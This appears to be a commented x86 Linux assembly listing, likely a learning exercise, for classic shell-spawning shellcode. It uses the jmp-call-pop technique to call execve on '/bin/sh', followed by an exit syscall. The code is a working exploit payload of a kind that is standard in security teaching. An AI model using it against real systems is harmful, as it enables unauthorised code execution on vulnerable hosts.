global _start
_start:
xor	eax, eax

jmp short string
code:

; clear all the registers
xor		eax, eax
xor		ebx, ebx
xor		ecx, ecx
xor		edx, edx

; store pointer to /bin/sh in ebx
pop		ebx

; put a null on the stack and then the address to /bin/sh
push		eax
push		ebx

; *Addr of /bin/sh
; NULL

; esp points to the top of the stack
; hence it points to the address of /bin/sh and a null
mov		ecx, esp

; put a null on the stack and use the same esp trick
; to make edx point to null
push eax
mov 		edx, esp

mov		al, 0xb ; execve
int 		0x80



mov		ebx, 0x0
mov 	eax, 0x1
int		0x80

string:
call code
db	'/bin/sh', 0x0
